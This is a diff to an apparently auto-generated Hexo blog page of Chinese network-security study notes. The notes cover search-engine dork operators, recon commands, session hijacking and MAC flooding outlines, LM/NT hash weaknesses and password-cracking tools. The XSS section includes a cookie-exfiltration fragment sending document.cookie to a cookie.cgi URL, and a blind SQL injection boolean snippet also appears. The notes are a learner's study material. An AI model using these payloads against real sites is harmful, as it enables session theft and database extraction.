@@ -134,7 +134,7 @@
 <meta property="og:site_name" content="disshu">
 <meta property="og:description" content="打开本地web服务器 12345678sudo nginxsudo php-fpmsudo lsof -i:4000//防止4000被占用，报错kill -9 进程号hexo clean//第一步hexo g//生成静态文件，编译是否正确hexo d//部署hexo s//本地,配合前两步使用  高级搜索：site：语法“site:” 只搜索指定网域里的关键词，例如“exploits site:h">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-09T12:50:28.271Z">
+<meta property="og:updated_time" content="2019-12-10T11:26:54.292Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网络安全随记">
 <meta name="twitter:description" content="打开本地web服务器 12345678sudo nginxsudo php-fpmsudo lsof -i:4000//防止4000被占用，报错kill -9 进程号hexo clean//第一步hexo g//生成静态文件，编译是否正确hexo d//部署hexo s//本地,配合前两步使用  高级搜索：site：语法“site:” 只搜索指定网域里的关键词，例如“exploits site:h">
@@ -390,7 +390,7 @@
 <p>allinurl：如果含有多个关键词，则用这个</p>
 <p>allintitle&amp;intitle：搜索标题关键字，如果有多个，则用allintitle</p>
 <p>related：按相似搜索将列出与指定网页相似的页面，例如”related:<a href="http://www.securityfocus" target="_blank" rel="noopener">www.securityfocus</a><br>.com将返回与Securityfocus筑页相似的页面。注意在”related:”与网址间不可以有空格</p>
-<p>cache:网 页快照，google将返回给你他储存下来的历史页面。如果你同时指定了其他查询词，google将在搜索结果里以高亮显示。例如查询”cache: <a href="http://www.hackingspirits.com&quot;" target="_blank" rel="noopener">www.hackingspirits.com&quot;</a></p>
+<p>cache:网页快照，google将返回给你他储存下来的历史页面。如果你同时指定了其他查询词，google将在搜索结果里以高亮显示。例如查询”cache: <a href="http://www.hackingspirits.com&quot;" target="_blank" rel="noopener">www.hackingspirits.com&quot;</a></p>
 <p>guest:在返回的结果里将高亮显示”guest”。</p>
 <p>filetype：后面可以加你想要找的文件后缀。</p>
 <p>info:查找指定站点的一些基本信息</p>
@@ -399,17 +399,21 @@
 <hr>
 <h2 id="工具命令："><a href="#工具命令：" class="headerlink" title="工具命令："></a>工具命令：</h2><p><em>ping:-i设置ttl -t一直发 -l 指定长度包<br>nslookup:<br>host：host 主机名 出ip地址 host ip出主机名<br>hostnew<br>traceroute:linux用法<br>tracert：windows用法<br>nmap<br>telent：远程连接<br>net：net user /add<br>dns查询<br>dig 加ip 要筛选的内容<br>whois ip查询域名 #whois 查询<br>fierce -dns baidu.com -threads 3#fierce dig nslookup是dns查询<br>su -c command 用户 跳转到账号为用户 执行command 语句 执行后再回去</em></p>
 <hr>
-<h3 id="ip欺骗"><a href="#ip欺骗" class="headerlink" title="ip欺骗"></a>ip欺骗</h3><p>会话劫持过程<br>发现目标主机-&gt;确定会话状态-&gt;猜测序列号-&gt;使靶机下线-&gt;接管会话，创建后门<br>针对源路由欺骗：禁止路由器的源路由<br>sql注入过程<br>寻找可能存在sql注入漏洞的连接<br>测试该网站是否有sql漏洞<br>爆数据<br>共享式局域网嗅探(使用广播方式)<br>广播，单播，组播，混杂</p>
+<h3 id="ip欺骗"><a href="#ip欺骗" class="headerlink" title="ip欺骗"></a>ip欺骗</h3><p>简单的ip更改(没有什么用，返回不了有效的信息)<br>会话劫持过程<br>发现目标主机-&gt;确定会话状态-&gt;猜测序列号-&gt;使靶机下线-&gt;接管会话，创建后门<br>针对源路由欺骗：禁止路由器的源路由<br>sql注入过程<br>寻找可能存在sql注入漏洞的连接<br>测试该网站是否有sql漏洞<br>爆数据<br>共享式局域网嗅探(使用广播方式)<br>广播，单播，组播，混杂</p>
 <h2 id="mac洪泛攻击，基于交换式局域网嗅探技术-理论上不能进行嗅探"><a href="#mac洪泛攻击，基于交换式局域网嗅探技术-理论上不能进行嗅探" class="headerlink" title="mac洪泛攻击，基于交换式局域网嗅探技术(理论上不能进行嗅探)"></a>mac洪泛攻击，基于交换式局域网嗅探技术(理论上不能进行嗅探)</h2><p>发送请求的主机不回对ARP应答进行验证<br>大多数主机会接受未请求的arp应答且不进行验证<br>主机不会验证ip地址和mac地址的绑定是否正确<br>向交换机发送大量含有虚假MAC地址的数据帧，交换机的映射表就会溢出，此时交换机就会跟集线器一样通过广播方式向所有端口发送数据包，此时我们可以嗅探</p>
-<h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM-HASH"></a>LM-HASH</h2><p><strong>口令的最大长度为14个字符(14个字节)，如果不够用0字符相凑,分割成两个7字节<br>首先字母转为大写字符，通过str_to_key(),转为两个八个字节 64比特</strong><br><em>缺陷:密钥太短，如果口令不足七位，那么最后七位的部分是固定的</em></p>
-<h2 id="NT-HASH"><a href="#NT-HASH" class="headerlink" title="NT-HASH"></a>NT-HASH</h2><p><strong>使用unicode编码，MD4加密，最后生成128位<br>缺陷：明文口令大小写太敏感，无法根据NT-HASH值判断明文长度</strong></p>
-<h2 id="口令破解"><a href="#口令破解" class="headerlink" title="口令破解:"></a>口令破解:</h2><p><strong>windows:使用l0phcrack和Pwdump找到SAM文件散列<br>join the ripper破解口令或者Ophcrack</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark分析，overflow分析，sql注入分析</span><br></pre></td></tr></table></figure>
+<h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM-HASH"></a>LM-HASH</h2><p><strong>口令的最大长度为14个字符(14个字节)，如果不够用0字符相凑,分割成两个7字节<br>首先字母转为大写字符，通过str_to_key(),转为两个八个字节 64比特</strong></p>
+<ul>
+<li>缺陷:密钥太短，如果口令不足七位，那么最后七位的部分是固定的<h2 id="NT-HASH"><a href="#NT-HASH" class="headerlink" title="NT-HASH"></a>NT-HASH</h2></li>
+<li><em>使用unicode编码，MD4加密，最后生成128位<br>缺陷：明文口令大小写太敏感，无法根据NT-HASH值判断明文长度*</em><h2 id="口令破解"><a href="#口令破解" class="headerlink" title="口令破解:"></a>口令破解:</h2></li>
+<li><em>windows:使用l0phcrack和Pwdump找到SAM文件散列<br>join the ripper破解口令或者Ophcrack*</em><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark分析，overflow分析，sql注入分析</span><br></pre></td></tr></table></figure>
 
+</li>
+</ul>
 <h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>应用层:ssh,pgp<br>传输层:ssl-&gt;tls<br>网络层:ipsec and so on<br>建立vpn的两个基本问题：<br>1、隧道化<br>2、加密</p>
 <hr>
 <h2 id="sql注入不常见语句"><a href="#sql注入不常见语句" class="headerlink" title="sql注入不常见语句"></a>sql注入不常见语句</h2><p><em>and 1=(select id from (select * from admin where id=1) where asc(mid(username,1,1))==i)<br>i去遍历</em></p>
-<h2 id="xss语句"><a href="#xss语句" class="headerlink" title="xss语句"></a>xss语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.com/cookie.cgi?’+document.cookie</span><br><span class="line">src=&quot;javascript:&quot;</span><br><span class="line">[img]javascript:(内容)[/img]</span><br></pre></td></tr></table></figure>
+<h2 id="xss语句"><a href="#xss语句" class="headerlink" title="xss语句"></a>xss语句</h2><p>反射型XSS<br>存储型XSS<br>DOM型XSS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.com/cookie.cgi?’+document.cookie</span><br><span class="line">src=&quot;javascript:&quot;</span><br><span class="line">[img]javascript:(内容)[/img]</span><br></pre></td></tr></table></figure>
 
 
       
